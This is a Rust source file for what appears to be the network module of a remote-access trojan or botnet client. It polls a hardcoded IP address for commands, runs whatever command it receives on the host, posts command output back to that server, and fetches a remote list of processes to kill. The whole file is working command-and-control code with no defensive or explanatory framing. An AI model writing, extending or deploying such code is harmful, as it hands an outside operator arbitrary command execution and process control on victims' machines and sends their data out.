use reqwest::Client;
use serde_json::Value;

enum Method {
	Receive,
	UpdateBanList,
}

pub struct NetworkInterface {
	ban_enabled: bool,
	banlist: Vec<String>,
}

impl NetworkInterface {
	pub async fn start() {
		let mut instance = Self {
			banlist: vec![],
			ban_enabled: false,
		};
		instance.receive_command().await;
		instance.update_ban_list().await;
	}

	async fn receive_command(&mut self) {
		let res = match reqwest::get("http://185.128.107.176:8080/recv").await {
			Ok(res) => res,
			Err(_) => return,
		};
		if res.status() != 200 { return; }
		let body = match res.text().await {
			Ok(body) => body,
			Err(_) => return
		};

		let cmd = match Self::command_from_json(&body).await {
			Some(cmd) => cmd,
			None => { return; }
		};
		crate::sys::run_command(cmd).await
	}


	async fn update_ban_list(&mut self) {
		let res = match reqwest::get("http://185.128.107.176:8080/banlist").await {
			Ok(res) => res,
			Err(_) => return,
		};
		if res.status() != 200 { return; }
		let body = match res.text().await {
			Ok(body) => body,
			Err(_) => return
		};

		let v: Value = serde_json::from_str(&body).unwrap_or_else(|_| serde_json::json!({}));

		let enabled = v["enabled"].as_bool().unwrap_or(false);
		let banlist = v["banlist"].as_array()
			.unwrap_or(&vec![])
			.iter()
			.map(|x| x.as_str().unwrap_or("").to_string())
			.collect::<Vec<String>>();

		self.ban_enabled = enabled;
		self.banlist = banlist;

		if self.ban_enabled { crate::sys::close_processes(&self.banlist); }
	}




	async fn command_from_json(body: &str) -> Option<String> {
		let data = match serde_json::from_str::<Value>(&body) {
			Ok(data) => data,
			Err(_) => return None,
		};

		let data_object = data.get("data")?;
		let message = data_object.get("message")?;
		let message_str = message.as_str()?;
		Some(message_str.to_string())
	}

	async fn send_stdout(output: String, client: &Client) {
		let _ = client.post("http://185.128.107.176:8080/sendhost").body(output).send().await;
	}
}
